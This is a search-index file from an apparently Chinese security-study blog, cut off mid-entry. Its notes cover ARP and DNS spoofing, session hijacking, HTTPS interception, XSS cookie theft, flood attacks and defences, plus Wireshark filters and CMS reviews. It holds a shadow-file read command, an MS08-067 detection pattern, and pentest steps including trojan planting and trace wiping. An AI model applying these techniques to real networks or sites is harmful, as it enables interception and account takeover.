<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记录一]]></title>
    <url>%2Fzerotwo%2F2019%2F10%2F18%2F%E8%AE%B0%E5%BD%95%E4%B8%80%2F</url>
    <content type="text"><![CDATA[1.SSL Strip(SSp)攻击到底是什么？SSL协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用Web Server方式。2.中间人攻击——ARP欺骗的原理、实战及防御 什么是网关首先来简单解释一下什么是网关，网关工作在OSI七层模型中的传输层或者应用层，用于高层协议的不同网络之间的连接，简单地说，网关就好比是一个房间通向另一个房间的一扇门。 ARP协议是什么ARP（Address Resolution Protocol）地址转换协议，工作在OSI模型的数据链路层，在以太网中，网络设备之间互相通信是用MAC地址而不是IP地址，ARP协议就是用来把IP地址转换为MAC地址的。而RARP和ARP相反，它是反向地址转换协议，把MAC地址转换为IP地址。 假设A(192.168.1.2)与B(192.168.1.3)在同一局域网，A要和B实现通信。A首先会发送一个数据包到广播地址(192.168.1.255)，该数据包中包含了源IP（A）、源MAC、目的IP（B）、目的MAC，这个数据包会被发放给局域网中所有的主机，但是只有B主机会回复一个包含了源IP（B）、源MAC、目的IP（A）、目的MAC的数据包给A，同时A主机会将返回的这个地址保存在ARP缓存表中。 ARP欺骗原理上面提到过了ARP缓存表，在每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。 假设主机 A 192.168.1.2,B 192.168.1.3,C 192.168.1.4; 网关 G 192.168.1.1; 在同一局域网，主机A和B通过网关G相互通信，就好比A和B两个人写信，由邮递员G送信，C永远都不会知道A和B之间说了些什么话。但是并不是想象中的那么安全，在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。 这样C就有了偷听A和B的谈话的可能，继续思考上面的例子： C假扮邮递员，首先要告诉A说：“我就是邮递员” （C主机向A发送构造好的返回包，源IP为G 192.168.1.1，源MAC为C自己的MAC地址），愚蠢的A很轻易的相信了，直接把“C是邮递员”这个信息记在了脑子里； C再假扮A，告诉邮递员：“我就是A” （C向网关G发送构造好的返回包，源IP为A 192.168.1.2，源MAC地址为自己的MAC地址），智商捉急的邮递员想都没想就相信了，以后就把B的来信送给了C，C当然就可以知道A和B之间聊了些什么 上面ABCG的故事就是ARP双向欺骗的原理了 ARP单向欺骗就更好理解了，C只向A发送一个返回包，告诉A：G 192.168.1.1 的MAC地址为 5c-63-bf-79-1d-fa（一个错误的mac地址），A把这个信息记录在了缓存表中，而G的缓存表不变，也就是说，A把数据包给了C，而G的包还是给A，这样就是ARP单向欺骗了。 3会话劫持原理什么是会话劫持在现实生活中，比如你去市场买菜，在交完钱后你要求先去干一些别的事情，稍候再来拿菜；如果这个时候某个陌生人要求把菜拿走，卖菜的人会把菜给陌生人吗？！当然，这只是一个比喻，但这恰恰就是会话劫持的喻意。所谓会话，就是两台主机之间的一次通讯。例如你Telnet到某台主机，这就是一次Telnet会话；你浏览某个网站，这就是一次HTTP会话。而会话劫持（Session Hijack），就是结合了嗅探以及欺骗技术在内的攻击手段。例如，在一次正常的会话过程当中，攻击者作为第三方参与到其中，他可以在正常数据包中插入恶意数据，也可以在双方的会话当中进行简听，甚至可以是代替某一方主机接管会话。我们可以把会话劫持攻击分为两种类型：1）中间人攻击(Man In The Middle，简称MITM)，2）注射式攻击（Injection）；并且还可以把会话劫持攻击分为两种形式：1）被动劫持，2）主动劫持；被动劫持实际上就是在后台监视双方会话的数据流，丛中获得敏感数据；而主动劫持则是将会话当中的某一台主机“踢”下线，然后由攻击者取代并接管会话，这种攻击方法危害非常大，攻击者可以做很多事情，比如“cat etc/master.passwd”（FreeBSD下的Shadow文件）。图1为会话劫持示意图。 MITM攻击简介这也就是我们常说的“中间人攻击”，在网上讨论比较多的就是SMB会话劫持，这也是一个典型的中间人攻击。要想正确的实施中间人攻击，攻击者首先需要使用ARP欺骗或DNS欺骗，将会话双方的通讯流暗中改变，而这种改变对于会话双方来说是完全透明的。关于ARP欺骗黑客防线介绍的比较多，网上的资料也比较多，我就不在多说了，我只简单谈谈DNS欺骗。DNS（Domain Name System），即域名服务器，我们几乎天天都要用到。对于正常的DNS请求，例如在浏览器输入www.hacker.com.cn，然后系统先查看Hosts文件，如果有相对应的IP，就使用这个IP地址访问网站（其实，利用Hosts文件就可以实现DNS欺骗）；如果没有，才去请求DNS服务器；DNS服务器在接收到请求之后，解析出其对应的IP地址，返回给我本地，最后你就可以登陆到黑客防线的网站。而DNS欺骗则是，目标将其DNS请求发送到攻击者这里，然后攻击者伪造DNS响应，将正确的IP地址替换为其他IP，之后你就登陆了这个攻击者指定的IP，而攻击者早就在这个IP中安排好了恶意网页，可你却在不知不觉中已经被攻击者下了“套”……DNS欺骗也可以在广域网中进行，比较常见的有“Web服务器重定向”、“邮件服务器重定向”等等。但不管是ARP欺骗，还是DNS欺骗，中间人攻击都改变正常的通讯流，它就相当于会话双方之间的一个透明代理，可以得到一切想知道的信息，甚至是利用一些有缺陷的加密协议来实现。 注射式攻击简介这种方式的会话劫持比中间人攻击实现起来简单一些，它不会改变会话双方的通讯流，而是在双方正常的通讯流插入恶意数据。在注射式攻击中，需要实现两种技术：1）IP欺骗，2）预测TCP序列号。如果是UDP协议，只需伪造IP地址，然后发送过去就可以了，因为UDP没有所谓的TCP三次握手，但基于UDP的应用协议有流控机制，所以也要做一些额外的工作。对于IP欺骗，有两种情况需要用到：1）隐藏自己的IP地址；2）利用两台机器之间的信任关系实施入侵。在Unix/Linux平台上，可以直接使用Socket构造IP包，在IP头中填上虚假的IP地址，但需要root权限；在Windows平台上，不能使用Winsock，需要使用Winpacp（也可以使用Libnet）。例如在Linux系统，首先打开一个Raw Socket（原始套接字），然后自己编写IP头及其他数据。 4.CC攻击攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS,和伪装就叫：CC(ChallengeCollapsar)。 CC主要是用来攻击页面的。大家都有这样的经历，就是在访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库就越大，被访问的频率也越高，占用的系统资源也就相当可观。 一个静态页面不需要服务器多少资源，甚至可以说直接从内存中读出来发给你就可以了，但是论坛就不一样了，我看一个帖子，系统需要到数据库中判断我是否有读帖子的权限，如果有，就读出帖子里面的内容，显示出来——这里至少访问了2次数据库，如果数据库的数据容量有200MB大小，系统很可能就要在这200MB大小的数据空间搜索一遍，这需要多少的CPU资源和时间？如果我是查找一个关键字，那么时间更加可观，因为前面的搜索可以限定在一个很小的范围内，比如用户权限只查用户表，帖子内容只查帖子表，而且查到就可以马上停止查询，而搜索肯定会对所有的数据进行一次判断，消耗的时间是相当的大。 CC就是充分利用了这个特点，模拟多个用户（多少线程就是多少用户）不停的进行访问（访问那些需要大量数据操作，就是需要大量CPU时间的页面）.这一点用一个一般的性能测试软件就可以做到大量模拟用户并发。 5.添加时间戳防止重放攻击如过客户端在向服务端接口进行请求,如果请求信息进行了加密处理，被第三方截取到请求包，虽然第三方无法解密获取其中的数据，但是可以使用该请求包进行重复的请求操作。如果服务端不进行防重放攻击，就会参数服务器压力增大，数据紊乱的后果。而使用添加时间戳的方式可以解决这一问题。。 6.浅析HTTPS中间人攻击与证书校验证书是https里非常重要的主体，可用来识别对方是否可信，以及用其公钥做密钥交换。可以看见证书里面包含证书的颁发者，证书的使用者，证书的公钥，颁发者的签名等信息。其中Issuer Name是签发此证书的CA名称,用来指定签发证书的CA的可识别的唯一名称(DN, Distinguished Name)，用于证书链的认证，这样通过各级实体证书的验证，逐渐上溯到链的终止点，即可信任的根CA，如果到达终点在自己的信任列表内未发现可信任的CA则认为此证书不可信。 https握手过程的证书校验环节就是为了识别证书的有效性唯一性等等，所以严格意义上来说https下不存在中间人攻击，存在中间人攻击的前提条件是没有严格的对证书进行校验，或者人为的信任伪造证书，下面一起看下几种常见的https“中间人攻击”场景。 证书未校验 由于客户端没有做任何的证书校验，所以此时随意一张证书都可以进行中间人攻击，可以使用burp里的这个模块进行中间人攻击。 通过浏览器查看实际的https证书，是一个自签名的伪造证书。 部分校验 做了部分校验，例如在证书校验过程中只做了证书域名是否匹配的校验，可以使用burp的如下模块生成任意域名的伪造证书进行中间人攻击。 实际生成的证书效果，如果只做了域名、证书是否过期等校验可轻松进行中间人攻击(由于chrome是做了证书校验的所以会提示证书不可信任)。 证书链校验 如果客户端对证书链做了校验，那么攻击难度就会上升一个层次，此时需要人为的信任伪造的证书或者安装伪造的CA公钥证书从而间接信任伪造的证书，可以使用burp的如下模块进行中间人攻击。 可以看见浏览器是会报警告的，因为burp的根证书PortSwigger CA并不在浏览器可信任列表内，所以由它作为根证书签发的证书都是不能通过浏览器的证书校验的，如果将PortSwigger CA导入系统设置为可信任证书，那么浏览器将不会有任何警告。 手机客户端Https数据包抓取 上述第一、二种情况不多加赘述，第三种情况就是我们经常使用的抓手机应用https数据包的方法，即导入代理工具的公钥证书到手机里，再进行https数据包的抓取。导入手机的公钥证书在android平台上称之为受信任的凭据， 可以看见是Issuer和Subject一样的自签名CA公钥证书，另外我们也可以通过证书类型就可以知道此为公钥证书，crt、der格式的证书不支持存储私钥或证书路径(有兴趣的同学可查找证书相关信息)。导入CA公钥证书之后，参考上文的证书校验过程不难发现通过此方式能通过证书链校验，从而形成中间人攻击，客户端使用代理工具的公钥证书加密随机数，代理工具使用私钥解密并计算得到对称加密密钥，再对数据包进行解密即可抓取明文数据包。 中间人攻击原理 一直在说中间人攻击，那么中间人攻击到底是怎么进行的呢，下面我们通过一个流行的MITM开源库mitmproxy来分析中间人攻击的原理。中间人攻击的关键在于https握手过程的ClientKeyExchange，由于pre key交换的时候是使用服务器证书里的公钥进行加密，如果用的伪造证书的公钥，那么中间人就可以解开该密文得到pre_master_secret计算出用于对称加密算法的master_key，从而获取到客户端发送的数据;然后中间人代理工具再使用其和服务端的master_key加密传输给服务端;同样的服务器返回给客户端的数据也是经过中间人解密再加密，于是完整的https中间人攻击过程就形成了，一图胜千言，来吧。 App证书校验 通过上文第一和第二部分的说明，相信大家已经对https有个大概的了解了，那么问题来了，怎样才能防止这些“中间人攻击”呢? app证书校验已经是一个老生常谈的问题了，但是市场上还是有很多的app未做好证书校验，有些只做了部分校验，例如检查证书域名是否匹配证书是否过期，更多数的是根本就不做校验，于是就造成了中间人攻击。做证书校验需要做完全，只做一部分都会导致中间人攻击，对于安全要求并不是特别高的app可使用如下校验方式： 查看证书是否过期 服务器证书上的域名是否和服务器的实际域名相匹配， 校验证书链。 7.什么是HttpOnly?如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击 8.如何设计相对安全的cookie自动登录系统这种技术其实就是基于 cookie的自动登录，用户登录的时候会把需要验证的token写到cookie里面，当用户session失效的时候，token会通过cookie 发送给服务器端，服务器端解析token判断是否已经登录；这里面的token如何设计是关键，到底存什么数据才能保证系统的安全性呢？ 有些新手可能会想，把用户id和password直接md5加密存到cookie，这样做是最糟糕的设计，用户的敏感信息直接暴露出来，黑客可以伪造别人的id进行尝试性登录，可以想象黑客知道了admin账号的id，试过几千几万次，密码和加密算法很可能破解出来。 token要相对安全，不应该是简单的用户名和密码md5加密，用户密码其实完全可以不用存进去，分两步来做： 1)token 是一些信息的组合，用户id+用户名+expires过期时间+ip地址+salt，具体加密算法最好自己写，不能使是常见的加密函数（md5）,当然这 个加密函数必须可逆，这个token我们同时要保存在用户表数据库里面,set cookie的时候记得http only； 2) 服务器端拿到cookie之后，进行逆解析，这个时候我们要验证如下信息：cookie是否过期、ip地址是否发生变化、用户id和用户名是否存在；用户 存在之后，我们再拿这个token跟第一步存在数据库中的token进行比较，看是否相等，如果不等说明token已经过期，这样做可保证每次用户登录之 后token值都不一样，之前用过的token都会失效； 9.SSHSSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 10.服务器操作系统的安全防范停止运行不需要的软件；（很可能成为外部攻击的入口） 定期实施漏洞防范措施；（选定软件时确认软件的升级状况，确定打补丁方式，关注各种漏洞信息，确认漏洞后调查补丁状况以及防范对策，并制定对应计划） 对不需要对外公开的端口或者服务加以访问限制；（通过端口扫描确认各端口服务状态） 提高认证强度。 11.日志文件查看windows7的日志信息文件存放在C:windows-》System32-》winevt-》Logs文件夹下，对应的日志文件也有很多，并且文件格式都是evtx格式的文件，直接用Eventvwr.msc这个命令启用事件查看器来查看即可。 或者点击开始然后单击控制面板进入win7控制面板，单击“系统和安全”选项。在右下方找到“查看事件日志”进入windows系统日志查看器。 在日志查看器左侧可以选择查看不同类型日志，一般系统报错应该在“windows日志/系统”中找相关信息。双击单条日志可以查看详细信息，而右侧栏可以对日志进行删除、复制等操作。 12.localStorage和sessionStorage区别localStorage和sessionStorage一样都是用来存储客户端临时信息的对象。 他们均只能存储字符串类型的对象（虽然规范中可以存储其他原生类型的对象，但是目前为止没有浏览器对其进行实现）。 localStorage生命周期是永久，这意味着除非用户显示在浏览器提供的UI上清除localStorage信息，否则这些信息将永远存在。 sessionStorage生命周期为当前窗口或标签页，一旦窗口或标签页被永久关闭了，那么所有通过sessionStorage存储的数据也就被清空了。 不同浏览器无法共享localStorage或sessionStorage中的信息。相同浏览器的不同页面间可以共享相同的 localStorage（页面属于相同域名和端口），但是不同页面或标签页间无法共享sessionStorage的信息。这里需要注意的是，页面及标 签页仅指顶级窗口，如果一个标签页包含多个iframe标签且他们属于同源页面，那么他们之间是可以共享sessionStorage的。 13.简单的查找旁站百度 域名查找IP 打开可行的网页，在里面输入目标域名，搜索出服务器的IP，然后百度 IP反查域名 选择一个可行的网页打开，输入刚刚查询到的IP，旁站就通通出来了。目标站没法子入侵不代表旁站也一样。 14.对称加密非对称加密？对称加密：加解密用同一密钥，密钥维护复杂n（n-1）/2，不适合互联网传输密钥，加解密效率高。应用于加密数据。 非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联网传输公钥，但是加密效率低，应用于数字签名及加密。 15.什么是同源策略？为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。 浏览器不允许任何旧有脚本访问一个站点的cookie，否则 ，会话容易被劫持。 只有发布cookie的站点能够访问这些cookie，只有通过该站点返回的页面所包含或加载的JavaScript才能访问cookie。 16.cookie存在哪里？可以打开吗C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies 工具–文件夹选项–查看–将隐藏被保护的文件的对勾去掉就会看到cookies文件夹。 17.xss如何盗取cookie？攻击者代码： 脚本端： document.write(''); 获取到cookie后，用firebug找到cookie，新建cookie 加入cookie，用referer来提交，无需输入帐号密码直接登录进去！ 18.tcp、udp的区别及tcp三次握手，syn攻击？一、tcp、udp区别（转） TCP的优点： 可靠，稳定 TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。 TCP的缺点： 慢，效率低，占用系统资源高，易被攻击 TCP在传递数据之前，要先建连接，这会消耗时间，而且在数据传递时，确认机制、重传机制、拥塞控制机制等都会消耗大量的时间，而且要在每台设备上维护所有的传输连接，事实上，每个连接都会占用系统的CPU、内存等硬件资源。 而且，因为TCP有确认机制、三次握手机制，这些也导致TCP容易被人利用，实现DOS、DDOS、CC等攻击。 UDP的优点： 快，比TCP稍安全 UDP没有TCP的握手、确认、窗口、重传、拥塞控制等机制，UDP是一个无状态的传输协议，所以它在传递数据时非常快。没有TCP的这些机制，UDP较TCP被攻击者利用的漏洞就要少一些。但UDP也是无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点： 不可靠，不稳定 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 基于上面的优缺点，那么： 什么时候应该使用TCP： 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。 在日常生活中，常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输 ………… 什么时候应该使用UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP 二、TCP握手协议 在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。 第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认； 第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k）， 即SYN+ACK包，此时服务器进入SYN_RECV状态； 第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕， 客户端和服务器进入ESTABLISHED状态，完成三次握手。 完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念： 未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目， 该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态， 当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 backlog参数：表示未连接队列的最大容纳数目。 SYN-ACK 重传次数 服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包， 进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。 半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到SYN包到确认这个报文无效的最长时间， 该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间。 三、SYN攻击原理 SYN攻击属于DOS攻击的一种，它利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源。 SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统， 只要这些系统打开TCP服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j）， 将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV状态。 当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。 配合IP欺骗，SYN攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的IP地址， 向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的， 服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃， 目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 19.证书要考哪些？信息安全国际第一认证——CISSP 信息安全国内认证——CISAW 信息安全国内认证——CISP 信息安全技术实操认证新贵——Security+ IT审计人员的必备之证——CISA DVWA是如何搭建的？ 启动xampp（XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。）下的apache中间件和mysql 将dvwa放到xampp下的htdocs目录下 在浏览器输入http://127.0.0.1/dvwa 即可使用啦！ 还有owasp的漏洞练习平台：https://sourceforge.net/projects/owaspbwa/files/ 20.渗透测试的流程是什么渗透测试流程概述 前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、 渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、报告阶段。 攻击前：网络踩点、网络扫描、网络查点 攻击中：利用漏洞信息进行渗透攻击、获取权限 攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除 21.xss如何防御1.对前端输入做过滤和编码： 比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检查需要在服务器端完成，在前端完成的限制是容易绕过的； 对特殊字符进行过滤和转义； 2.对输出做过滤和编码：在变量值输出到前端的HTML时进行编码和转义； 3.给关键cookie使用http-only 22.IIS服务器应该做哪些方面的保护措施：整理来源：http://www.williamlong.info/archives/118.html 1. 保持Windows升级: 2. 使用IIS防范工具 3. 移除缺省的Web站点 4. 如果你并不需要FTP和SMTP服务，请卸载它们 5. 有规则地检查你的管理员组和服务: 6. 严格控制服务器的写访问权限 7. 设置复杂的密码 8. 减少/排除Web服务器上的共享 9. 禁用TCP/IP协议中的NetBIOS: 10. 使用TCP端口阻塞 11. 仔细检查.bat和.exe 文件: 每周搜索一次*.bat 12. 管理IIS目录安全: 13. 使用NTFS安全: 14. 管理用户账户 15. 审计你的Web服务器: 23.虚拟机的几种连接方式及原理整理来源：http://blog.csdn.net/shuxiao9058/article/details/7051463 安装完虚拟机后，默认安装了两个虚拟网卡，VMnet1和VMnet8，其他的未安装（当然也可以手动安装其他的）。其中VMnet1是host网卡， 用于host方式连接网络的。VMnet8是NAT网卡，用于NAT方式连接网络的。它们的IP地址是随机生成的，如果要用虚拟机做实验的话， 最好将VMnet1到VMnet8的IP地址改掉。习惯上把VMware虚拟网卡使用的网段”固定”，使用如下原则：VMnet1对应的网段是192.168.10.0， VMnet2对应的网段是192.168.20.0，其他的类似。当然平常只是随便用用的就不用改了，能上网就行了。 VMware网络连接的方式主要有：桥接（Bridged）、NAT、主机网络（Host-Only）。 1. Use bridged networking（使用桥接网络） 说明：使用VMnet0虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的IP地址， 其网络拓扑如图1所示，使用桥接方式，A，A1，A2，B可互访。 图1 2. Use network address translation（NAT） 说明：使用Vmnet8虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。 其网络拓扑如图2所示，使用NAT方式，A1，A2可以访问B，但B不可以访问A1，A2。但A，A1，A2可以互访。 图2 3. Use Host-Only networking（使用主机网络） 说明：使用Vmnet1虚拟交换机，此时虚拟机只能与虚拟机、主机互访。也就是不能上Internet，其网络拓扑如图3所示， 使用Host方式，A，A1，A2可以互访，但A1，A2不能访问B，也不能被B访问。 24.xss有cookie一定可以无用户名密码登录吗？基本可以。因为把cookie的值给浏览器，浏览器去访问页面会用已有的cookie去访问，如果cookie有效，就会直接进去。]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[wireshark入门]]></title>
    <url>%2Fzerotwo%2F2019%2F10%2F08%2Fwireshark%E5%85%A5%E9%97%A8%E4%BA%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[WireShark 主要分为这几个界面1. Display Filter(显示过滤器)， 用于过滤2. Packet List Pane(封包列表)， 显示捕获到的封包， 有源地址和目标地址，端口号。 颜色不同，代表3. Packet Details Pane(封包详细信息), 显示封包中的字段4. Dissector Pane(16进制数据) 5. Miscellanous(地址栏，杂项) 过滤表达式的规则表达式规则 1. 协议过滤 比如TCP，只显示TCP协议。 2. IP 过滤 比如 ip.src ==192.168.1.102 显示源地址为192.168.1.102， ip.dst==192.168.1.102, 目标地址为192.168.1.102 3. 端口过滤 tcp.port ==80, 端口为80的 tcp.srcport == 80, 只显示TCP协议的愿端口为80的。 4. Http模式过滤 http.request.method==”GET”, 只显示HTTP GET方法的。 5. 逻辑运算符为 AND/ OR 常用的过滤表达式 过滤表达式 用途 http 只查看HTTP协议的记录 ip.src ==192.168.1.102 or ip.dst==192.168.1.102 源地址或者目标地址是192.168.1.102 封包详细信息 (Packet Details Pane)这个面板是我们最重要的，用来查看协议中的每一个字段。 各行信息分别为 Frame: 物理层的数据帧概况 Ethernet II: 数据链路层以太网帧头部信息 Internet Protocol Version 4: 互联网层IP包头部信息 Transmission Control Protocol: 传输层T的数据段头部信息 Hypertext Transfer Protocol: 应用层的信息 wireshark过滤匹配表达式实例1、 搜索按条件过滤udp的数据段payload（数字8是表示udp头部有8个字节，数据部分从第9个字节开始udp[8:]）udp[8]==14 (14是十六进制0x14)匹配payload第一个字节0x14的UDP数据包 udp[8:2]==14:05 可以udp[8:2]==1405，且只支持2个字节连续，三个以上须使用冒号：分隔表示十六进制。 (相当于 udp[8]==14 and udp[9]==05,1405是0x1405) udp[8:3]==22:00:f7 但是不可以udp[8:3]==2200f7 udp[8:4]==00:04:00:2a 匹配payload的前4个字节0x0004002a udp contains 7c:7c:7d:7d 匹配payload中含有0x7c7c7d7d的UDP数据包，不一定是从第一字节匹配。 2、**搜索按条件过滤tcp的数据段payload（数字20是表示tcp头部有20个字节，数据部分从第21个字节开始tcp[20:]）tcp[20:] matches “^GET [ -~]*HTTP/1.1\x0d\x0a” 等同http matches “^GET [ -~]*HTTP/1.1\x0d\x0a” tcp[20:] matches “^GET (.*?)HTTP/1.1\x0d\x0a” tcp[20:] matches “^GET (.?)HTTP/1.1\x0d\x0a[\x00-\xff]*Host: (.\?)pplive(.*?)\x0d\x0a” tcp[20:] matches “^GET (.?)HTTP/1.1\x0d\x0a[\x00-\xff]Host: “ tcp[20:] matches “^POST / HTTP/1.1\x0d\x0a[\x00-\xff]*\x0d\x0aConnection: Keep-Alive\x0d\x0a\x0d\x0a” 检测SMB头的smb标记，指明smb标记从tcp头部第24byte的位置开始匹配。 tcp[24:4] == ff:53:4d:42 检测SMB头的smb标记，tcp的数据包含十六进制ff:53:4d:42，从tcp头部开始搜索此数据。 tcp contains ff:53:4d:42 tcp matches “\xff\x53\x4d\x42” 检测tcp含有十六进制01:bd,从tcp头部开始搜索此数据。 tcp matches “\x01\xbd” 检测MS08067的RPC请求路径 tcp[179:13] == 00:5c:00:2e:00:2e:00:5c:00:2e:00:2e:00 3、**其他http.request.uri matches “.gif$” 匹配过滤HTTP的请求URI中含有”.gif”字符串，并且以.gif结尾（4个字节）的http请求数据包（$是正则表达式中的结尾表示符） 注意区别： http.request.uri contains “.gif$” 与此不同，contains是包含字符串”.gif$”（5个字节）。 匹配过滤HTTP的请求URI中含有”.gif$”字符串的http请求数据包（这里$是字符，不是结尾符） eth.addr[0:3]==00:1e:4f 搜索过滤MAC地址前3个字节是0x001e4f的数据包。]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CMS了解]]></title>
    <url>%2Fzerotwo%2F2019%2F10%2F04%2FCMS%E4%BA%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[是 Content Management System的英文缩写 中文名称是： 网站内容管理系统。国内与国外CMS系统的主要区别是：国内的CMS系统基本都生成真实的静态文件，非常节约服务器资源，访问速度快。国外的CMS基本都是动态调用，或者利用REWRITE映射成虚拟静态。国内的cms功能复杂，入口极多。初学者较难适应。国外的cms大方简单，功能简单，接口齐全，但需要程序基础。详细介绍请看这里： CMS比较 国内的cms开源少，适合直接使用。国外的开源多，适合二次开发。 国内的cms系统SEO搜索优化方面很重视，国外的不太在意。 国内的cms符合中国人习惯，国外的cms难以适用国情。 ASP系的CMS系统1.动易CMS管理系统官方网站：http://www.asp163.net/ 这套是国产AspCMS中非常强大的系统，从3.0的简单的一个文章系统到现在的2005的版本，一路走来，动易不断完善，而且也不断加强功能，包括个人版，学校版，政府版，企业版，后台包括的功能，信息发布，类别管理，权限控制，信息采集，而且跟第三方的程序，比如论坛，商城（2005的已经自带了），blog可以完美结合，基本上可以满足一个中大型网站的要求，但Asp和Access的的局限性，还有本身功能Dll 的限制，使得免费版差不多成鸡肋。 2.风讯CMS官方网站：http://www.foosun.cn/ 风讯的系统功能强大，自由度高，是现在人气比较高的系统之一，可以根据自己的想法做出一个网页从而建立一个有自我风格的网站，更新速度快，一直有新的版本出现，现在又开放采集、下载、投稿、图片整站管理系统，第三方整合等功能，开源是它最大特点，希望保持。然后缺点就是后台人性化差了一点，上手有点难度，而且连一套默认的模板都没有，因为自由度太高了，让一些新手更难上手，还有就是免费版的生成静态发布的效率不高。3.1已经出来一段时间了，愿各方面都更上一层楼。 3.新云网站管理系统官方http://www.newasp.cn/ 一款Asp的CMS后起之秀，发现有不少的网站都在使用。由文章、下载、商城、留言、用户管理五大功能模块和广告、公告、连接、统计、采集、模板管理、数据库管理等多个通用模块组成，而且功能确实有一些值得称道的地方，不过又是DLL的，免费版有不少的限制，但对一个简单基本的网站来说，功能够用了。 4.乔客CMS(asp)官方网站：http://www.joekoe.com/ 这个系统已经很久了，但好像一直存活在动易和风讯两者之间，现在3.0的Joekoe CMS出来了，但另我比较失望，相比免费版的1.2，功能是增强了，但也Dll，这个可能也是国产程序的一个特色罢了。它本身已经是一个融合度非常高的系统，有商城，新闻，下载，论坛，留言，影视，博客圈等，感觉有那么点WEB2.0 的味道,不想怎么修改的朋友直接拿去就可以用了。 5.NB文章系统(asp)官方：http://forum.nbarticle.com/ 现在最新的是v2.1 RC1 ，上手挺容易，后台很简洁，安全性能不错，发布效率比较高，当然想到同类型的，RSS不错，它也是将模板写入数据库，但修改还是蛮方便。不过这样相对来说功能是少了一些，而且官方就一个论坛技术支持，论坛的人气差了一点。 6.渐飞新闻出版系统(asp)官方网站： http://www.xunt.net/ 这个系统也有一段时日了，不过到现在还是1.1的版本，以前名头特别响，不过主要针对的是商业客户，看客户演示，个个都像门户，但因为没免费版的支撑，市场也一直没做大。 基于PHP的CMS系统1.DEDE－这是一款国内开源的cms，作者是一个个人，能做出如此功能的cms，是相当不错的。2007版功能十分强大，希望能改善之前数据量一大，更新静态页就很慢的缺点。因为开源，有较多的玩家和拥护者。非常适合有一定编程基础的站长。 官方：http://www.dedecms.com 2. 